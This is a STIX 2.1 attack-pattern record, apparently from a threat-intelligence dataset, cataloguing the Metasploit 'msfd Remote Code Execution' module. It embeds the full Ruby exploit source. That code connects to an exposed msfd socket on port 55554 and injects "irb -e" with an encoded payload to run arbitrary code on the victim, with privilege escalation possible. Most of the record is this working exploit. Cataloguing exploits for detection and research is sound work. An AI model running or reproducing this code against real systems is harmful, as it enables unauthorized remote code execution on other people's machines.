{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65c6fa6b-69b9-4cde-8af9-195517ab1687",
    "created": "2024-08-14T17:06:42.032613Z",
    "modified": "2024-08-14T17:06:42.032617Z",
    "name": "Metasploit msfd Remote Code Execution",
    "description": " Metasploit's msfd-service makes it possible to get a msfconsole-like interface over a TCP socket. If this socket is accessible on a remote interface, an attacker can execute commands on the victim's machine.  If msfd is running with higher privileges than the current local user this module can also be used for privilege escalation. In that case port forwarding on the compromised host can be used.  Code execution is achieved with the msfconsole command: irb -e 'CODE'. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/msfd_rce_remote.rb",
            "external_id": "msfd_rce_remote.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Metasploit msfd Remote Code Execution',\n      'Description'    => %q{\n      Metasploit's msfd-service makes it possible to get a msfconsole-like\n      interface over a TCP socket. If this socket is accessible on a remote\n      interface, an attacker can execute commands on the victim's machine.\n\n      If msfd is running with higher privileges than the current local user,\n      this module can also be used for privilege escalation. In that case,\n      port forwarding on the compromised host can be used.\n\n      Code execution is achieved with the msfconsole command: irb -e 'CODE'.\n      },\n      'Author'         => 'Robin Stenvi <robin.stenvi[at]gmail.com>',\n      'License'        => BSD_LICENSE,\n      'Platform'       => \"ruby\",\n      'Arch'           => ARCH_RUBY,\n      'Payload'        =>\n        {\n          'Space'    => 8192,   # Arbitrary limit\n          'BadChars' => \"\\x27\\x0a\",\n          'DisableNops' => true\n        },\n      'Targets'  =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2018-04-11',  # Vendor notification\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(55554)\n      ])\n  end\n\n  def check\n    connect\n    data = sock.get_once\n    if data.include?(\"msf\")\n      disconnect\n      return Exploit::CheckCode::Appears\n    end\n    disconnect\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    connect\n    sock.get_once\n    sock.put \"irb -e '\" + payload.encoded + \"'\\n\"\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-11,  # Vendor notification",
    "x_mitre_platforms": [
        "\"ruby\""
    ]
}